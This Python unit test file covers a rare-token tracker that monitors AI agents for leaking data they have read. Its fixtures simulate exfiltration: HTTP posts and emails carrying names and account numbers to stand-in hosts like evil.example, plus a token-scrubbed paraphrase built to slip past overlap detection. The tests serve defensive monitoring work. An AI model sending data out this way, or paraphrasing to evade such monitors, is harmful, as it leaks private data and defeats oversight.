#!/usr/bin/env python3
"""Unit tests for gov/rare_token.py (wave-136 lane).

Seams: extract_rare_tokens, RareTokenTracker.observe_read /
check_egress, and the no-token-strings privacy invariant.
"""

import os
import sys
import unittest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from gov import rare_token as rt  # noqa: E402


class TestExtractRareTokens(unittest.TestCase):
    def test_proper_nouns_rare(self):
        toks = rt.extract_rare_tokens("Contact Marlowe Finch at Zephyrcorp.")
        self.assertIn("marlowe", toks)
        self.assertIn("finch", toks)
        self.assertIn("zephyrcorp", toks)

    def test_common_words_not_rare(self):
        toks = rt.extract_rare_tokens(
            "The customer account needs renewal soon. Please contact "
            "them about the contract before the due date.")
        self.assertEqual(toks, [])

    def test_account_ids_rare(self):
        toks = rt.extract_rare_tokens("account ZX-88142 renewal QX-22901")
        self.assertIn("88142", toks)
        self.assertIn("22901", toks)

    def test_short_fragments_never_rare(self):
        # "zx"/"qx" are 2-char fragments: never rare (FP control).
        toks = rt.extract_rare_tokens("ZX QX AB")
        self.assertEqual(toks, [])

    def test_short_numbers_never_rare(self):
        toks = rt.extract_rare_tokens("about 400 roles in 2024")
        self.assertEqual(toks, [])

    def test_long_digit_runs_rare(self):
        toks = rt.extract_rare_tokens("contract value 480000")
        self.assertIn("480000", toks)

    def test_mixed_alnum_rare(self):
        toks = rt.extract_rare_tokens("see ticket abc123 for details")
        self.assertIn("abc123", toks)

    def test_sorted_deterministic(self):
        a = rt.extract_rare_tokens("Zed Yara Xeno")
        b = rt.extract_rare_tokens("Zed Yara Xeno")
        self.assertEqual(a, sorted(a))
        self.assertEqual(a, b)

    def test_non_string_safe(self):
        self.assertEqual(rt.extract_rare_tokens(None), [])
        self.assertEqual(rt.extract_rare_tokens(123), [])
        self.assertEqual(rt.extract_rare_tokens(""), [])

    def test_token_cap_deterministic(self):
        many = " ".join("uniqueword%04d" % i for i in range(600))
        t = rt.RareTokenTracker(max_tokens_per_doc=50)
        r = t.observe_read("a", "d", many)
        self.assertEqual(r["rare_token_count"], 50)


class TestTracker(unittest.TestCase):
    def _read_doc(self, t):
        return t.observe_read(
            "agent-1", "doc-1",
            "Zephyrcorp Industries account ZX-88142. "
            "Contact Marlowe Finch. Renewal QX-22901.")

    def test_observe_read_reports_count(self):
        t = rt.RareTokenTracker()
        r = self._read_doc(t)
        self.assertTrue(r["observed"])
        self.assertGreaterEqual(r["rare_token_count"], 3)

    def test_novel_dest_carryover_requires_approval(self):
        t = rt.RareTokenTracker()
        self._read_doc(t)
        r = t.check_egress(
            "agent-1", "http_post",
            {"url": "https://evil.example/x", "data": "x"},
            payload_text="Renewal for Zephyrcorp account 88142, "
                         "Marlowe Finch confirmed 22901.")
        self.assertEqual(r["verdict"], "require_approval")
        self.assertGreaterEqual(r["overlap"], 3)
        self.assertEqual(r["source_id"], "doc-1")

    def test_known_dest_carryover_flags_only(self):
        t = rt.RareTokenTracker()
        self._read_doc(t)
        t.check_egress("agent-1", "http_post",
                       {"url": "https://vendor.example/sync"},
                       payload_text="Weekly status: all systems operational.")
        r = t.check_egress(
            "agent-1", "http_post",
            {"url": "https://vendor.example/sync"},
            payload_text="Renewal for Zephyrcorp account 88142, "
                         "Marlowe Finch confirmed 22901.")
        self.assertEqual(r["verdict"], "flag")

    def test_partial_overlap_flags(self):
        t = rt.RareTokenTracker()
        self._read_doc(t)
        r = t.check_egress("agent-1", "http_post",
                           {"url": "https://evil.example/x"},
                           payload_text="Marlowe called about the renewal.")
        self.assertEqual(r["verdict"], "flag")
        self.assertEqual(r["overlap"], 1)

    def test_no_overlap_behavioral_flag(self):
        # Wave-137: zero CONTENT overlap, but the agent read a
        # token-bearing doc and egresses to a novel destination —
        # the behavioral tier flags the read->egress sequence
        # (triage-only, never a hold). The old wave-136 "allow" is
        # preserved only when no reads happened (test_no_read_silent).
        t = rt.RareTokenTracker()
        self._read_doc(t)
        r = t.check_egress("agent-1", "http_post",
                           {"url": "https://evil.example/x"},
                           payload_text="The customer account needs renewal.")
        self.assertEqual(r["verdict"], "behavioral_flag")
        self.assertEqual(r["overlap"], 0)

    def test_no_read_silent(self):
        t = rt.RareTokenTracker()
        r = t.check_egress("agent-1", "http_post",
                           {"url": "https://evil.example/x"},
                           payload_text="Zephyrcorp 88142 Marlowe Finch")
        self.assertEqual(r["verdict"], "allow")

    def test_agent_isolation(self):
        t = rt.RareTokenTracker()
        self._read_doc(t)  # agent-1 reads
        r = t.check_egress("agent-2", "http_post",
                           {"url": "https://evil.example/x"},
                           payload_text="Zephyrcorp 88142 Marlowe Finch")
        self.assertEqual(r["verdict"], "allow")

    def test_best_source_wins(self):
        t = rt.RareTokenTracker()
        t.observe_read("a", "doc-a", "Zephyrcorp 88142")
        t.observe_read("a", "doc-b", "Zephyrcorp 88142 Marlowe Finch 22901")
        r = t.check_egress("a", "http_post", {"url": "https://e.example"},
                           payload_text="Zephyrcorp 88142 Marlowe Finch")
        self.assertEqual(r["source_id"], "doc-b")
        self.assertEqual(r["overlap"], 4)

    def test_result_carries_no_token_strings(self):
        t = rt.RareTokenTracker()
        self._read_doc(t)
        r = t.check_egress("agent-1", "http_post",
                           {"url": "https://evil.example/x"},
                           payload_text="Zephyrcorp 88142 Marlowe Finch")
        blob = str(r)
        for tok in ("zephyrcorp", "marlowe", "finch", "88142"):
            self.assertNotIn(tok, blob)
        self.assertNotIn("rare_tokens", r)

    def test_custom_threshold(self):
        t = rt.RareTokenTracker(carryover_threshold=5)
        self._read_doc(t)
        r = t.check_egress("agent-1", "http_post",
                           {"url": "https://evil.example/x"},
                           payload_text="Zephyrcorp 88142 Marlowe Finch")
        # overlap is 4 < 5 -> flag, not require_approval.
        self.assertEqual(r["verdict"], "flag")

    def test_invalid_threshold_rejected(self):
        with self.assertRaises(ValueError):
            rt.RareTokenTracker(carryover_threshold=0)

    def test_send_email_extraction(self):
        t = rt.RareTokenTracker()
        self._read_doc(t)
        r = t.check_egress("agent-1", "send_email",
                           {"to": "x@evil.example",
                            "body": "Zephyrcorp 88142 Marlowe Finch 22901"})
        self.assertEqual(r["verdict"], "require_approval")
        self.assertEqual(r["destination"], "x@evil.example")

    def test_doc_cap_drops_oldest(self):
        t = rt.RareTokenTracker(max_docs_per_agent=2)
        t.observe_read("a", "d1", "Zephyrcorp")
        t.observe_read("a", "d2", "Marlowe")
        t.observe_read("a", "d3", "Finch")
        r = t.check_egress("a", "http_post", {"url": "https://e.example"},
                           payload_text="Zephyrcorp")
        # d1 was dropped -> no CONTENT overlap from d1. Wave-137: d2/d3
        # are still token-bearing docs read this run, so the
        # behavioral tier flags the novel-destination egress.
        self.assertEqual(r["verdict"], "behavioral_flag")
        self.assertEqual(r["overlap"], 0)
        self.assertNotIn("d1", r["source_ids"])


class TestTrackerT3Composition(unittest.TestCase):
    """Wave-152 follow-up: the tiered-verdict T3 composition running
    INSIDE RareTokenTracker.check_egress (opt-in content_monitor)."""

    DOC = ("Project Nightingale Q3 closeout: revenue $4.82M, churn 3.1%, "
           "headcount 214, attrition concentrated in the Helios division.")

    # Footprinted paraphrase: bulleted key:value structure preserved,
    # every rare token scrubbed (zero overlap — asserted, not assumed).
    FOOTPRINTED = ("briefing notes:\n"
                   "- program: songbird drive\n"
                   "- quarter: third\n"
                   "- income: about four point eight million\n"
                   "- loss: near three percent\n"
                   "- staff: two hundred fourteen\n")

    def _tracker(self):
        from gov.egress_content import EgressContentMonitor  # noqa: E402
        return rt.RareTokenTracker(content_monitor=EgressContentMonitor())

    def _read(self, t):
        t.observe_read("a1", "doc1", self.DOC)

    def _egress(self, t, dest, payload):
        return t.check_egress("a1", "http_post",
                              {"url": dest, "data": payload},
                              payload_text=payload)

    def test_t3_escalates_with_provenance(self):
        t = self._tracker()
        self._read(t)
        r = self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
        self.assertEqual(r["overlap"], 0)
        self.assertEqual(r["verdict"], "require_approval")
        self.assertEqual({p["tier"] for p in r["provenance"]}, {"T1", "T2"})
        for p in r["provenance"]:
            for k in ("tier", "detector", "signal", "measured",
                      "threshold", "contribution"):
                self.assertIn(k, p)

    def test_no_monitor_no_escalation(self):
        # Opt-in ceiling: without a monitor the ladder is the
        # wave-141 ladder, byte-identical (behavioral_flag out).
        t = rt.RareTokenTracker()
        self._read(t)
        r = self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
        self.assertEqual(r["verdict"], "behavioral_flag")
        self.assertEqual(r["provenance"], [])

    def test_prose_never_escalates(self):
        # T2 alone never escalates, even with a monitor attached.
        t = self._tracker()
        self._read(t)
        r = self._egress(t, "https://evil.example/x",
                         "The songbird drive wrapped its third quarter.")
        self.assertEqual(r["verdict"], "behavioral_flag")
        self.assertEqual(r["provenance"], [])

    def test_overlap_ladder_not_t3(self):
        # The overlap ladder owns its hold; provenance stays empty —
        # the T3 rule only fires on the behavioral flag.
        t = self._tracker()
        self._read(t)
        r = self._egress(t, "https://evil.example/x",
                         "Nightingale Helios attrition churn")
        self.assertGreaterEqual(r["overlap"], 3)
        self.assertEqual(r["verdict"], "require_approval")
        self.assertEqual(r["provenance"], [])

    def test_known_destination_no_t3(self):
        # Destination-history FP control: no behavioral flag, no T3.
        t = self._tracker()
        self._read(t)
        self._egress(t, "https://partner.example/hook", "warming note")
        r = self._egress(t, "https://partner.example/hook", self.FOOTPRINTED)
        self.assertNotEqual(r["verdict"], "require_approval")
        self.assertEqual(r["provenance"], [])

    def test_t3_provenance_carries_no_token_strings(self):
        t = self._tracker()
        self._read(t)
        r = self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
        blob = str(r)
        for tok in ("nightingale", "helios", "attrition", "churn",
                    "headcount", "closeout"):
            self.assertNotIn(tok, blob)

    def test_monitor_failure_propagates_fail_closed(self):
        # An attached component that fails does not silently drop the
        # escalation path (same fail-closed discipline as the
        # taint/destination ledgers).
        class Boom:
            def check(self, *a, **k):
                raise RuntimeError("damaged monitor")
        t = rt.RareTokenTracker(content_monitor=Boom())
        self._read(t)
        with self.assertRaises(RuntimeError):
            self._egress(t, "https://evil.example/x", self.FOOTPRINTED)


if __name__ == "__main__":
    unittest.main()
